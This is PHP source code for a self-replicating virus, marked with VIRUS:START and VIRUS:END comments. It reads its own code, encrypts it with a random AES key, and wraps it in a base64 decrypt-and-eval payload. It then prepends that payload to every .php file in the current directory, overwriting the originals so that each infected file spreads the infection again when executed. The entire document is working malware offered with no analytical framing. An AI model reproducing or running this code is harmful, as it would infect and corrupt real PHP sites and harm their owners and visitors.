<?php
// VIRUS:START
function execute($virus)
{
    $infection = '<?php ' . encryptedVirus($virus) . ' ?>'; // VIRUS
    $fileNames = glob('*.php'); // Get a list of all php files

    foreach ($fileNames as $fileName) { // Check each file

        $script = fopen($fileName, 'r'); // Open file
        $infected = fopen($fileName . '.infected', 'w'); // Let's write to a new file
        fputs($infected, $infection, strlen($infection));

        while ($contents = fgets($script)) {
            fputs($infected, $contents, strlen($contents));
        }

        fclose($script);//Close both handles
        fclose($infected);

        rename($fileName, $fileName . '.original'); //Move the infected file in to place
        rename($fileName . '.infected', $fileName);

        unlink($fileName . '.original');
    }
}

function encryptedVirus($virus)
{
    $str = '0123456789abcdef'; // Gen key
    $key = '';

    for ($i = 0; $i < 64; $i++) {
        $key .= $str[rand(0, strlen($str) - 1)];
    }
    $key = pack('H*', $key);

    // Encrypt
    $iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);
    $iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);
    $encryptedVirus = mcrypt_encrypt(
        MCRYPT_RIJNDAEL_128,
        $key,
        $virus,
        MCRYPT_MODE_CBC,
        $iv
    );

    // Encode
    $encodedVirus = base64_encode($encryptedVirus);
    $encodedIV = base64_encode($iv);
    $encodedKey = base64_encode($key);

    // Payload
    $payload = "
        \$encryptedVirus = '$encodedVirus';
        \$iv = '$encodedIV';
        \$key = '$encodedKey';
        \$virus = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, base64_decode(\$key), base64_decode(\$encryptedVirus), MCRYPT_MODE_CBC, base64_decode(\$iv));
        eval(\$virus);
        execute(\$virus);
    ";

    return $payload;
}

// VIRUS:END

$virus = file_get_contents(__FILE__);
$virus = substr(
    $virus,
    strpos($virus, '// VIRUS:START')
);
$virus = substr(
    $virus,
    0,
    strpos($virus, PHP_EOL . '// VIRUS:END') + strlen(PHP_EOL . '// VIRUS:END')
);
execute($virus);

